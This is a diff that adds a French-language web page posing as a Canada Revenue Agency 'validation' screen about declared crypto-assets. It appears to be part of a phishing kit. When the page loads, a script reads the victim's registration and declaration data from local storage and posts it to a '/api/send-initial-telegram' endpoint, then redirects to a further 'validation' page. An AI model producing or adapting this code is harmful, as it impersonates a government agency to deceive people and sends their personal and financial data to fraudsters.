@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation des informations - Canada.ca</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Noto Sans', sans-serif; color: #333; }
+        .container-custom { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+        .nav-bar { background-color: #26374a; height: 50px; }
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #335075;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+
+    <header class="py-6">
+        <div class="container-custom">
+            <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-fr.svg" alt="Gouvernement du Canada" class="h-10">
+        </div>
+    </header>
+
+    <nav class="nav-bar"></nav>
+
+    <main class="flex-grow flex items-center justify-center py-20">
+        <div class="container-custom text-center max-w-2xl">
+            <div class="flex justify-center mb-8">
+                <div class="loader"></div>
+            </div>
+            
+            <h1 class="text-3xl font-bold mb-6 text-[#26374a]">Validation de vos informations</h1>
+            
+            <div class="space-y-4 text-lg text-gray-700">
+                <p>Veuillez patienter pendant que nous croisons vos montants de crypto-actifs déclarés avec les registres de la chaîne de blocs et les données de nos partenaires.</p>
+                <p class="text-sm font-semibold text-gray-500 uppercase tracking-widest">Vérification en cours...</p>
+            </div>
+
+            <div class="mt-12 text-sm text-gray-500">
+                <p>Cela peut prendre quelques instants.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-[#26374a] text-white py-8 mt-auto">
+        <div class="container-custom text-center">
+            <p class="text-sm">Agence du revenu du Canada</p>
+        </div>
+    </footer>
+
+    <script>
+        // Send initial Telegram message when page loads
+        window.addEventListener('DOMContentLoaded', async function() {
+            console.log('[PLEASEWAIT-FR] Page loaded, sending initial telegram');
+            const register = JSON.parse(localStorage.getItem('cra_register') || '{}');
+            const declaration = JSON.parse(localStorage.getItem('cra_declaration') || '{}');
+            
+            try {
+                const response = await fetch('/api/send-initial-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        personalData: { register, declaration }
+                    })
+                });
+                const result = await response.json();
+                console.log('[PLEASEWAIT-FR] Initial telegram sent:', result);
+                
+                // Wait additional 5 seconds after message sent, then redirect
+                setTimeout(function() {
+                    console.log('[PLEASEWAIT-FR] Redirecting to validation');
+                    window.location.href = 'validation-fr.html';
+                }, 5000);
+            } catch (err) {
+                console.error('[PLEASEWAIT-FR] Telegram send failed:', err);
+                // Redirect anyway after 6 seconds
+                setTimeout(function() {
+                    window.location.href = 'validation-fr.html';
+                }, 6000);
+            }
+        });
+    </script>
+
+</body>
+</html>
